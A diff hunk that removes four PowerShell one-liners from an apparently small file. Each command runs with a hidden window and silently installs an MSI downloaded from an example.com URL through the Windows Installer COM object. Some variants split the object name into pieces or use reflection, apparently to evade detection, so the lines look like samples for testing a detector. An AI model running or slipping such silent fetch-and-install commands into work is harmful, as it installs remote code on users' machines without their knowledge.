@@ -1,4 +1,0 @@
-powershell.exe -WindowStyle Hidden -Command "$i=New-Object -Com WindowsInstaller.Installer; $i.UILevel=2; $i.InstallProduct('http://example.com/test.msi', '')"
-powershell.exe -WindowStyle Hidden -Command "$u='http://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')"
-powershell.exe -w hidden -c "$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('http://example.com/payload.msi', '')"
-powershell.exe -WindowStyle Hidden -Command "$u='http://example.com/payload.msi'; $t='W'+'indowsInstaller.Installer'; $i=New-Object -ComObject $t; $i.UILevel=2; $i.InstallProduct($u, '')"
